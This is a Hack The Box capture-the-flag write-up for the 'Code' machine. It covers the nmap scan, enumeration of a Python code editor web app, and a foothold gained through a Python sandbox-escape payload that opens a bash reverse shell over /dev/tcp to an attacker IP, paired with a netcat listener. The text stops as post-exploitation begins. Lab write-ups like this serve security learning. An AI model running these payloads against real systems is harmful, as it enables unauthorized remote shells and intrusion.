# 🔓 Hack The Box - Code

> Initial enumeration and setup for the Hack The Box machine named **Code**.

pwned

![pwned](https://github.com/PrimeMurcia/htb/blob/main/code/ss/code20.png?raw=true)

---

## 📅 Start Date

`4/19/2025`

---

## 📡 HTB VPN Connection

Before starting, connect to the HTB VPN:

```bash
sudo openvpn ~/Downloads/HTB.ovpn
```

Verify connectivity to the target machine:

```bash
ping -c 3 <HTB_Code_IP>
```
![VPN Connection](https://github.com/PrimeMurcia/htb/blob/main/code/ss/code1.png?raw=true)

🔍 Nmap Scan

Performed a service and version detection scan with aggressive options:

nmap -sC -sV -A -T4 -Pn -oN code.scan 10.10.11.62

![Nmap Result](https://github.com/PrimeMurcia/htb/blob/main/code/ss/code2.png?raw=true)

🧪 Results Summary

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
5000/tcp open  http    Gunicorn 20.0.4

Detailed Notes:

    Port 22 (SSH): OpenSSH 8.2p1 — possibly used for shell access after exploitation.

    Port 5000 (HTTP): Gunicorn Python server hosting a Python Code Editor.

http-title: Python Code Editor
http-server-header: gunicorn/20.0.4

📍 OS Details:

    OS detected: Linux 5.x Kernel

    Network distance: 2 hops

🌐 Web Enumeration on Port 5000

Access the Python Code Editor interface at:

http://code.htb:5000

![WebApp](https://github.com/PrimeMurcia/htb/blob/main/code/ss/code3.png?raw=true)

🛠️ Next Steps:

    Interact with the Python Code Editor. Test for:

        Arbitrary code execution

        Upload/execute payloads

        Sandbox escape (if limited)

## 🏴‍☠️ Initial Foothold - Reverse Shell

### 🎯 Objective:
Gain initial access to the target system by exploiting the Python Code Editor and establishing a reverse shell.

---

### 🧰 Prerequisites:

- ✅ **Python** must be installed on the **target** machine.
- ✅ **Netcat (nc)** must be installed on the **attacker's** machine.
- ✅ Ensure the **target machine can reach the attacker’s IP and port**.

---

### 🪝 Step-by-Step Guide: Gaining a Reverse Shell

#### 📌 Step 1: Set Up a Listener on the Attacker’s Machine

On your Kali/Parrot or attacker machine, open a terminal and start Netcat to listen for the incoming connection:

```bash
nc -lvnp 4444
```

![netcat](https://github.com/PrimeMurcia/htb/blob/main/code/ss/code6.png?raw=true)

Flags explanation:

    -l: Listen for incoming connections

    -v: Verbose output

    -n: Don’t perform DNS resolution

    -p 4444: Use port 4444 for the listener

📌 Step 2: Craft the Reverse Shell Payload

![payload](https://github.com/PrimeMurcia/htb/blob/main/code/ss/code5.png?raw=true)
![payload](https://github.com/PrimeMurcia/htb/blob/main/code/ss/code7.png?raw=true)

Use Python’s dynamic class reference to spawn a bash shell back to your machine:

(().__class__.__base__.__subclasses__()[317])(["/bin/bash", "-c", "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"])

    🔁 Replace ATTACKER_IP with your actual IP address (e.g., 10.10.14.89 from HTB VPN).

📌 Step 3: Execute the Payload on the Target Machine

Choose any of the following methods based on your access level:
🔹 Method 1: Direct Python Execution

If you already have a shell or console on the target:

python3 -c '(().__class__.__base__.__subclasses__()[317])(["/bin/bash", "-c", "bash -i >& /dev/tcp/10.10.14.89/4444 0>&1"])'

🔹 Method 2: Remote Code Execution (RCE) via Python Code Editor

Inject the payload through the web interface:

    Visit: http://code.htb:5000

    Enter the payload in the code execution area.

    Trigger execution.

![payload](https://github.com/PrimeMurcia/htb/blob/main/code/ss/code8.png?raw=true)

---

## 🧪 Post-Exploitation - Credentials Discovery

After gaining a reverse shell as `app-production`, I began local enumeration and discovered a SQL database named `database.db` located in the project directory:



